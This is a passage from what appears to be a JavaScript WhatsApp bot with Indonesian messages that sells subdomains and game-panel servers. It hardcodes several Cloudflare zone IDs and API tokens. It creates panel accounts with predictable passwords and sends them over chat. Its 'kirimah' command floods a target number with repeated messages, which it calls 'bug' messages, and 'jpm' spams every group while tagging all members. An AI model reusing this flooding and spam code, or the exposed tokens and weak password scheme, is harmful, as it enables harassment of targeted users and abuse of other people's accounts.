                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANELTHOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain43': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain44': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Pedia Official\nMau Join? Cuman 5.000 Ajaa\n\nHubungi wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By THOMZ PANEL⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
     case 'delgc':
  if (!isOwner) return m.reply(`khusus Creator`)
    if (!isGroup) return m.reply(`Khusus Group`)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini Tuan✅`)
break
       case 'addgc':
    if (!isGroup) return m.reply(`Khusus Group`)         
if (!isOwner) return m.reply(`khusus Creator`)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini Tuan✅`)
           break
        case 'kirimah': {
               if (!isPremium && !isOwner) return reply(mess.only.premium)
  if (!quoted) return m.reply('Format salah!!\nContoh: kirimah text,nomor,jumlah');
  
  let params = text.split(',');
  if (params.length < 3) return m.reply('Format salah!!\nContoh: kirim text,nomor,jumlah');

  let messageText = params[0];
  let targetNumber = params[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let messageCount = parseInt(params[2]);

  if (isNaN(messageCount) || messageCount < 1) return m.reply('Jumlah pesan harus berupa angka yang lebih besar dari 0.');

  const promises = [];
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      haikal.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
      })
    );
  }

  Promise.all(promises)
    .then(() => {
      m.reply(`Berhasil mengirim ${messageCount} bug pesan!`);
    })
    .catch(() => {
      m.reply('Gagal mengirim pesan!');
    });

  break;
}

case "15gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "15gb"
let egg = global.eggsnya
let loc = global.location
let memo = "15000"
let cpu = "300"
let disk = "15000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "16gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "16gb"
let egg = global.eggsnya
let loc = global.location
let memo = "16000"
let cpu = "320"
let disk = "16000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "17gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "17gb"
let egg = global.eggsnya
let loc = global.location
let memo = "17000"
let cpu = "340"
let disk = "17000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "18gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "18gb"
let egg = global.eggsnya
let loc = global.location
let memo = "18000"
let cpu = "360"
let disk = "18000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "19gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "19gb"
let egg = global.eggsnya
let loc = global.location
let memo = "19000"
let cpu = "380"
let disk = "19000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "20gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20gb"
let egg = global.eggsnya
let loc = global.location
let memo = "20000"
let cpu = "400"
let disk = "20000"
let email = username + "1398@thomz.com"
akunlo = "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg" 
if (!u) return
let d = (await haikal.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "thomz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*USERNAME* : ${user.username}
*PASSWORD* : ${password}
*LOGIN* : ${domain}
*INFO PANEL* : https://chat.whatsapp.com/D7fUhPRjWPMGlrFTqVhNIH
*TUTOR* : https://youtu.be/kBOs62HLMzU

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
haikal.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: haikal.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup
haikal
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

JANGAN LUPA DI PAKE BIAR G DI HAPUS SAMA BANG THOMZ
`)

}

break
case "listidgc": {
if (!isOwner) return reply(mess.only.owner)
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `ID GRUP\n\n`
for (let x of anu) {
let metadata2 = await haikal.groupMetadata(x)
teks += `${metadata2.id}\n`
}
reply(teks + `\nUntuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "ceknamagc": {
if (!isOwner) return reply(mess.only.owner)
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP BY THOMZ*\n\n`
for (let x of anu) {
let metadata2 = await haikal.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ Member : ${metadata2.participants.length}\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
    await reply(mess.wait)
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP BY THOMZ*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await haikal.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case "listgroup":{
if (!isOwner) return (`Ngapain ? Khusus thomz store Aja !!`)
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP BY THOMZ*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await haikal.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case "jpm": case "jpm2":{
if (!isOwner) return reply(`Khusus Bang Thomz`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await haikal.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await haikal.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
